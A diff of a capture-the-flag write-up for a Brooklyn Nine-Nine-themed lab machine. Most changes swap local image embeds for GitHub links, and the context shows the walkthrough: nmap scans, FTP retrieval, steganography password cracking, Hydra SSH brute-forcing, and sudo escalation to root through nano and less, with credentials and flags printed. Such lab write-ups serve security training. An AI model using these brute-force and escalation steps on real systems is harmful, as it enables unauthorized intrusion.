@@ -58,7 +58,7 @@ Read data files from: /usr/share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
            Raw packets sent: 7 (284B) | Rcvd: 4 (172B)
 ```
-![[Pasted image 20250414171836.png]]
+![1  ](https://github.com/user-attachments/assets/dfc8e2c3-802e-4fa0-8662-ed703f96ec69)
 
 
 ### Comprehensive Port Scan with `Nmap`
@@ -94,7 +94,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds
 
 ```
-![[Pasted image 20250414171957.png]]
+![2](https://github.com/user-attachments/assets/a8a22787-e900-42fa-b54f-c69a179199ba)
+
 
 # Enumeration
 
@@ -114,7 +115,7 @@ PORT   STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds
 ```
-![[Pasted image 20250414172123.png]]
+![3](https://github.com/user-attachments/assets/29197ed5-3b63-4b93-a89a-dfbcf6a44add)
 
 
 #### Login FTP with FTP Client
@@ -133,7 +134,8 @@ ftp> ls
 ftp> get note_to_jake.txt
 ftp> exit
 ```
-![[Pasted image 20250414172828.png]]
+![4](https://github.com/user-attachments/assets/06ba2b41-cc92-46aa-9995-685b4694039c)
+
 #### **note_to_jake.txt**
 ```
 cat note_to_jake.txt 
@@ -141,7 +143,8 @@ From Amy,
 
 Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
 ```
-![[Pasted image 20250414173010.png]]
+![5](https://github.com/user-attachments/assets/12ca4d8b-ba88-445c-9bd7-4b0cbba40944)
+
 
 #### Create a file all founded Usernames `usernames.txt`
 ```
@@ -194,7 +197,8 @@ Image Size                      : 533x300
 Megapixels                      : 0.160
 
 ```
-![[Pasted image 20250414182502.png]]
+![6](https://github.com/user-attachments/assets/cb2f1f93-3e84-4a80-87d5-fca1c4904662)
+
 
 #### **See all Strings in this Picture**
 ```
@@ -202,7 +206,8 @@ strings brooklyn99.jpg
 
 There is no information.
 ```
-![[Pasted image 20250414182750.png]]
+![7](https://github.com/user-attachments/assets/8ea63e21-2400-4b63-8c23-e39c24f966dc)
+
 #### **Check Embedded data with [[Steghide]]**
 ```
 steghide --info brooklyn99.jpg 
@@ -215,7 +220,8 @@ steghide: can not uncompress data. compressed data is corrupted.
 
 [Need Passphrase for Embadded data extraction]
 ```
-![[Pasted image 20250414183214.png]]
+![8](https://github.com/user-attachments/assets/b885c6f9-0b78-4ff5-b940-ea8bc8c5adea)
+
 
 #### **Bruit-force "brooklyn99.jpg" file extract password by [[Stegcracker]] tool** 
 ```
@@ -238,7 +244,8 @@ Your file has been written to: brooklyn99.jpg.out
 admin
 
 ```
-![[Pasted image 20250414184123.png]]
+![9](https://github.com/user-attachments/assets/5aab0868-9257-4f02-9d9e-30212ef1a9c8)
+
 
 #### **Extract this picture embedded data `brooklyn99.jpg` by [[Steghide]] tool**
 ```
@@ -247,7 +254,8 @@ Enter passphrase: admin
 
 wrote extracted data to "note.txt".
 ```
-![[Pasted image 20250414184427.png]]
+![10](https://github.com/user-attachments/assets/270325aa-9d3e-4a11-aeeb-a4678e167c1e)
+
 
 #### note.txt
 ```
@@ -257,7 +265,8 @@ fluffydog12@ninenine
 
 Enjoy!!
 ```
-![[Pasted image 20250414184628.png]]
+![11](https://github.com/user-attachments/assets/f4d07e8f-9a3a-4fb9-9f2c-7b46eb00897b)
+
 
 ### Try to Bruit-force all users Credentials dumping with `Hydra`
 ```
@@ -273,7 +282,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-14 20:14:
 [22][ssh] host: 10.10.105.128   login: jake   password: 987654321
 
 ```
-![[Pasted image 20250414201818.png]]
+![16](https://github.com/user-attachments/assets/3ea52efd-8bf3-46e3-8fd6-fce4fcd394db)
+
 
 # Exploitation `Method 1` with `Holt's `User
 
@@ -284,7 +294,8 @@ password: fluffydog12@ninenine
 
 holt@brookly_nine_nine:~$ 
 ```
-![[Pasted image 20250414190135.png]]
+![12](https://github.com/user-attachments/assets/470ac869-f778-45c6-8c51-adbde1a1bee8)
+
 
 #### Find `user.txt` Flag
 ```
@@ -294,7 +305,8 @@ holt@brookly_nine_nine:~$ find / -type f -name user.txt 2>/dev/null
 holt@brookly_nine_nine:~$ cat /home/holt/user.txt
 ee11cbb19052e40b07aac0ca060c23ee
 ```
-![[Pasted image 20250414190725.png]]
+![13](https://github.com/user-attachments/assets/219a843c-7b15-42ff-ad22-6b32e2ecdd54)
+
 
 ### Privilege Escalation
 - **Sudo Permissions binary list**
@@ -306,6 +318,7 @@ Matching Defaults entries for holt on brookly_nine_nine:
 User holt may run the following commands on brookly_nine_nine:
     (ALL) NOPASSWD: /bin/nano
 ```
+![14](https://github.com/user-attachments/assets/b81a396c-297b-4f76-99ed-505d6b70293f)
 
 - **Execute the `Nano` command with `Sudo`**
 ```
@@ -316,7 +329,8 @@ Use "fg" to return to nano.
 	Press ctrl+X - Execute commands
 	Execute this Command " reset; bash 1>&0 2>&0 "
 ```
-![[Pasted image 20250414200038.png]]
+![15](https://github.com/user-attachments/assets/1ad91262-a8b0-468b-b7f3-bcf44bda0736)
+
 - **Execute the root Command**
 ```
 Command to execute: reset; bash 1>&0 2>&0
@@ -341,7 +355,7 @@ Here is the flag: 63a9f0ea7bb98050796b649e85481845
 Enjoy!!
 
 ```
-![[Pasted image 20250414191536.png]]
+
 
 # Exploitation `Method 2` with `jake's `User
 
@@ -360,7 +374,8 @@ Last login: Tue May 26 08:56:58 2020
 jake@brookly_nine_nine:~$ 
 
 ```
-![[Pasted image 20250414202003.png]]
+![17](https://github.com/user-attachments/assets/7c9881f2-0d50-4372-bb07-b8269e93d47f)
+
 
 #### Find `user.txt` flag
 ```
@@ -369,7 +384,8 @@ jake@brookly_nine_nine:~$ find / -type f -name user.txt 2>/dev/null
 jake@brookly_nine_nine:~$ cat /home/holt/user.txt
 ee11cbb19052e40b07aac0ca060c23ee
 ```
-![[Pasted image 20250414202228.png]]
+![18](https://github.com/user-attachments/assets/a51af5b1-88c2-4920-9985-fb335b920239)
+
 
 ### Privilege Escalation
 ```
@@ -380,7 +396,8 @@ Matching Defaults entries for jake on brookly_nine_nine:
 User jake may run the following commands on brookly_nine_nine:
     (ALL) NOPASSWD: /usr/bin/less
 ```
-![[Pasted image 20250414202348.png]]
+![19](https://github.com/user-attachments/assets/f535741c-0fdc-4f03-92bb-668b07d64f07)
+
 
 #### Execute `less` Command
 ```
@@ -390,8 +407,10 @@ jake@brookly_nine_nine:~$ sudo less /etc/profile
 root@brookly_nine_nine:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-![[Pasted image 20250414203322.png]]
-![[Pasted image 20250414203527.png]]
+![19 1](https://github.com/user-attachments/assets/93f530f7-ab2e-461b-9fa3-b9f8489076ed)
+
+![21](https://github.com/user-attachments/assets/38b76a64-d46c-4d21-9220-09be81286877)
+
 
 #### Find `root.txt` flag
 ```
@@ -405,4 +424,4 @@ Here is the flag: 63a9f0ea7bb98050796b649e85481845
 
 Enjoy!!
 ```
-![[Pasted image 20250414203217.png]]]]
+![20](https://github.com/user-attachments/assets/ec0280eb-7e9f-45ea-8f8e-fc35153d1ecb)
